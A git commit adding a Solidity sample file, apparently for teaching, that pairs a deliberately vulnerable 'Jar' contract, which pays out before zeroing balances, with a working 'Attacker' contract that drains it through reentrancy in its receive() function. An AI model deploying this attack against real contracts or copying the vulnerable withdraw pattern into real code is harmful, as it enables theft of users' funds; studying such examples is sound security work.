8f6305a79e3726453b9be4797654421a66aeecf9
miyamok <58558301+miyamok@users.noreply.github.com>
2024-04-21 12:25:31 +0900

    working example for reentrancy attack

---
+++ sample-solidity/reentrancy.sol
@@ -0,0 +1,54 @@
+// SPDX-License-Identifier: MIT
+pragma solidity >=0.6.12 <0.9.0;
+
+contract Jar {
+
+    mapping(address=>uint) public balance;
+
+    constructor() payable {
+
+    }
+
+    function deposit() public payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        require(balance[msg.sender] != 0, "zero balance");
+        (bool s,) = msg.sender.call{ value: balance[msg.sender] }("");
+        require(s, "In VulnerableJar.withdrow(), call() failed.");
+        balance[msg.sender] = 0;
+    }
+}
+
+contract Attacker {
+
+    Jar public jar;
+    address public owner;
+
+    constructor(address _jar) payable {
+        jar = Jar(_jar);
+        owner = msg.sender;
+    }
+
+    function deposit() public {
+        jar.deposit{ value: 1 ether }();
+    }
+
+    function attack() public {
+        jar.withdraw();
+    }
+
+    receive() external payable {
+        if (address(jar).balance >= 1 ether) {
+            jar.withdraw();
+        }
+    }
+
+    function withdraw() public {
+        require (msg.sender == owner);
+        (bool s, ) = owner.call{ value: address(this).balance}("");
+        require (s);
+    }
+}
+
